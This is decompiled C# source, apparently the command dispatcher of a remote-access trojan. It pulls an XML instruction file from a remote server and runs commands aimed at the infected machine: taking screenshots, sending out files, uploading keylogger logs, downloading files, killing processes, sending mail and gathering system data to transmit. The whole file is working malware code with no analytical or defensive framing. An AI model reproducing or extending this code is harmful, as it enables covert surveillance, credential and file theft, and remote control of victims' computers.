using System;
using System.Collections.Generic;
using System.Xml;

internal sealed class Class10
{
	private XmlDocument xmlDocument_0;

	private int int_0;

	public Class10()
	{
		xmlDocument_0 = new XmlDocument();
	}

	public void method_0()
	{
		try
		{
			xmlDocument_0.Load(Class5.string_1);
		}
		catch
		{
			Console.WriteLine("No hay servidor web en el otro lado");
		}
	}

	public void method_1()
	{
		XmlNode documentElement = xmlDocument_0.DocumentElement;
		foreach (XmlNode item in documentElement)
		{
			if (!item.Name.Equals("version"))
			{
				continue;
			}
			int num = Convert.ToInt32(item.Attributes![0].Value);
			if (num <= int_0)
			{
				Console.WriteLine("version no superada");
				continue;
			}
			int_0 = num;
			XmlNodeList elementsByTagName = xmlDocument_0.GetElementsByTagName("instruction");
			foreach (XmlNode item2 in elementsByTagName)
			{
				try
				{
					if (!item2.Attributes![3].Value.Contains(Class5.string_2) && !item2.Attributes![3].Value.Equals("all"))
					{
						continue;
					}
					string key;
					if ((key = item2.Attributes![0].Value.ToUpper()) != null)
					{
						if (Class0.dictionary_0 == null)
						{
							Class0.dictionary_0 = new Dictionary<string, int>(9)
							{
								{ "WALLPAPER", 0 },
								{ "SNAPSHOT", 1 },
								{ "GETFILE", 2 },
								{ "GETKEYLOGGER", 3 },
								{ "SENDMAIL", 4 },
								{ "KILLPROCESS", 5 },
								{ "PLAYAUDIO", 6 },
								{ "DOWNLOADFILE", 7 },
								{ "GETREGISTERS", 8 }
							};
						}
						if (Class0.dictionary_0.TryGetValue(key, out var value))
						{
							switch (value)
							{
							case 0:
							{
								string string_ = Class5.smethod_2(item2.Attributes![1].Value);
								Class6.smethod_5(string_);
								goto end_IL_009f;
							}
							case 1:
								Class5.smethod_4();
								goto end_IL_009f;
							case 2:
								Class5.smethod_3(item2.Attributes![1].Value, item2.Attributes![0].Value, item2.Attributes![2].Value);
								goto end_IL_009f;
							case 3:
								Class5.smethod_3(Class6.smethod_14("win32").Replace(".exe", ".txt"), item2.Attributes![0].Value, item2.Attributes![2].Value);
								goto end_IL_009f;
							case 4:
							{
								string[] array = item2.Attributes![1].Value.ToString().Split(new char[1] { '|' });
								Class4 @class = new Class4(array[2], array[0], array[1], array[4], array[3], array[5], array[6]);
								@class.method_0(int.Parse(array[7]));
								goto end_IL_009f;
							}
							case 5:
								Class6.smethod_4(item2.Attributes![1].Value);
								goto end_IL_009f;
							case 6:
								Class6.smethod_8(item2.Attributes![1].Value);
								goto end_IL_009f;
							case 7:
								Class5.smethod_2(item2.Attributes![1].Value);
								goto end_IL_009f;
							case 8:
							{
								string text = string.Empty;
								try
								{
									foreach (string item3 in Class6.smethod_13())
									{
										text = text + item3 + "<br/>";
									}
								}
								catch
								{
								}
								finally
								{
									text += "<br/>";
								}
								try
								{
									foreach (string item4 in Class6.smethod_10())
									{
										text = text + item4 + "<br/>";
									}
								}
								catch
								{
								}
								finally
								{
									text += "<br/>";
								}
								try
								{
									foreach (string item5 in Class6.smethod_11())
									{
										text = text + item5 + "<br/>";
									}
								}
								catch
								{
								}
								finally
								{
									text += "<br/>";
								}
								try
								{
									foreach (string item6 in Class6.smethod_12())
									{
										text = text + item6 + "<br/>";
									}
								}
								catch
								{
								}
								finally
								{
									text += "<br/>";
								}
								try
								{
									foreach (string item7 in Class6.smethod_9())
									{
										text = text + item7 + "<br/>";
									}
								}
								catch
								{
								}
								finally
								{
									text += "<br/>";
								}
								Class5.smethod_5(text, item2.Attributes![0].Value.ToString(), item2.Attributes![2].Value.ToString(), 1);
								goto end_IL_009f;
							}
							}
						}
					}
					Class1.smethod_0(item2.Attributes![0].Value, item2.Attributes![1].Value, item2.Attributes![2].Value);
					end_IL_009f:;
				}
				catch
				{
				}
			}
		}
	}
}
